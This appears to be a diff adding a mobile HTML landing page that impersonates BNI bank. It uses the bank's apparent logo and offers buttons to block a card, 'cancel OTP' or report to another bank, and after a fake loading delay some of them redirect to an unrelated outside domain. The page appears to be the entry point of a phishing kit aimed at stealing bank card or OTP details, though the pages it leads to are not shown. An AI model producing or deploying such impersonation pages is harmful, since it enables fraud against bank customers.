@@ -1,1 +1,194 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#00A39E">
+    <title>Batalkan-Transaksi</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(to top right, #Ffffff, #ffffff);
+        }
 
+        /* Navbar Gambar */
+        .navbar {
+            width: 100%;
+            height: 50px;
+            background-color: #ffffff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .navbar img {
+            height: 50px;
+            cursor: pointer;
+        }
+
+        /* Slide Container */
+        .slider-container {
+            position: relative;
+            width: 100%;
+            height: 140px;
+            overflow: hidden;
+        }
+
+        .slider-container img {
+            position: absolute;
+            top: 3px;
+            left: 0;
+            width: 100%;
+            height: 140%;
+            object-fit: cover;
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+        }
+
+        .slider-container img.active {
+            opacity: 1;
+        }
+
+        /* Box Container */
+        .box {
+            background: linear-gradient(45deg, #ffffff, #ffff);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 50px auto;
+            width: 90%;
+            border: 1px solid #00A39E;
+            max-width: 300px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+
+        .box button {
+            width: 100%;
+            padding: 13px;
+            margin: 6px 0;
+            background-color: #00A39E;
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .box button:hover {
+            background-color: #00A39E;
+        }
+
+        /* Footer Gambar */
+        .footer {
+            width: 100%;
+            background-color: #ffffff;
+            text-align: center;
+            padding: 10px 0;
+            
+            border-top: 1px solid #ddd;
+        }
+
+        .footer img {
+            width: 180px;
+          margin-top:-13%;
+            height: auto; /* Menjaga proporsi gambar */
+        }
+
+        /* Loading Animation */
+        #loading {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            display: none;
+        }
+
+        #loading img {
+            width: 30%;
+            height: 8%;
+        }
+    </style>
+</head>
+<body>
+    <!-- Navbar -->
+    <div class="navbar">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEj0B4hsXcOW4QErfUeRzf36b1NL9D_WtRzyUuwN55vLh4YP_pqMD4Bu3phg-pAxFShMrg6QFxOregcVkvl1FUSknDDdWpKRkC9wyIH1UI_sCN2-vH-fitsKGreZCGjTKzXVetlRyMPrpOMxCJ8uXDBDdWZCSluJFUKsQCcPc-E8V2TUnUWlkZqcGuW0ZVpf" alt="BNI Logo">
+    </div>
+
+    <!-- Slider -->
+    <div class="slider-container">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEiKDiwuloaLGQK-pGtBhZdFfAUPyeQz027K5iWY8ASJVf8j7ihPQDzKsxC10EqYyU0k904fJ97vMZA_sPS8s0emHruS940iJPzUdf5djhHl0sN40WDkvhie5JAoaQL8D9AJ2D8fxjKX30KhCZIZA15QU1Hl6UVDtbEVbT1cu-LLYRjDD2Yl4z9o7NJXK5w4" class="active" alt="Slide 1">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhBFrtAlTBPVyaIRmkkVIO6BIf7nzeRxCZq9T4DlbskOsfqGGHFwH6cPBugqlIzof-IELDZo-7cDPHuLdZhZo0_XPsR8U0JCu-SAytfPCTxAe4qh5ePcywYm7sKKFVAtUGfOVgQ7_IjwFDuUr5isskddLPg08_FKareDlx3ZBjFOuvomIJm5TvCBZUFFK8D" alt="Slide 2">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhKDsPswuiUJbPAzoF9n3gBZuDGj7q_6zC_Q4Xu4lC6SEHU42WlCqBXeyFT10i0jRGNv-83Qeg2-BMvvETnoxI2_JGkD6ltCPoOZnW0Pur4MfUtXwquYUSRpxG_VnDwAuKsCsS0bYtPsTGyhz4whi0GK2ozsDGBxLmOsLeZF83dNQiS4JD0K_RR7ExS6thC" alt="Slide 3">
+    </div>
+
+    <!-- Button Box -->
+    <div class="box">
+        <button onclick="navigateTo('bs.html')">Blokir Kartu Kredit/Debit</button>
+        
+        <button onclick="navigateTo('oo.html')">Batalkan OTP</button>
+        
+        <button onclick="navigateTo('https://bsinettg.ninpap.online/yio.html')">Lapor Ke Bank Lain</button>
+        
+    </div>
+
+    <!-- Footer Gambar -->
+    <div class="footer">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEgYitvYOU4vUWVm_DJNtNXQosI_9eO6rXavb2NXbHObgdcr0zlaBUWKnCksegxsiiyNV-NiXJLOq-yiPe5ubMuVTyxFzsbUHDkaCluZjSpC5AqihiXc8tw_LVlO6uL8Nm7EPSu171ml4_Lw7VHxC1mpl3U1zWPC1qq6IBORirHAKH2_DXYVp6NT_KJf28CT" alt="Footer Logo">
+    </div>
+
+    <!-- Loading Animation -->
+    <div id="loading">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhQ9aKhcYr-jD-Xuln8u5uD5baNXxE5PFqt3wRv6i_6aP3qvBEUcUHnPRFTWIREqPTNupyZ0VD4EIaTVyGOQWmpkVjv7I-cITSsV8mXZllDnqz_vyDT72wr5CqcgxiNim65zk4rHVwwlwHp2AoeFPqiaSlT_PWYV5gqt1O6xtTAaB95myMjaNddwgpyn8qL" alt="Loading...">
+    </div>
+
+
+
+    <script>
+        
+        
+        // Slider functionality
+        const images = document.querySelectorAll('.slider-container img');
+        let currentIndex = 0;
+
+        setInterval(() => {
+            images[currentIndex].classList.remove('active');
+            currentIndex = (currentIndex + 1) % images.length;
+            images[currentIndex].classList.add('active');
+        }, 3000);
+
+
+
+
+function navigateTo(url) {
+        const loading = document.getElementById('loading');
+        loading.style.display = 'flex';
+
+        setTimeout(() => {
+            window.location.href = url;
+        }, 3000);
+    }
+
+    // Menghilangkan loading GIF saat pengguna kembali ke halaman ini
+    window.addEventListener('pageshow', function(event) {
+        if (event.persisted) {
+            document.getElementById('loading').style.display = 'none';
+        }
+    });
+    </script>
+</body>
+</html>
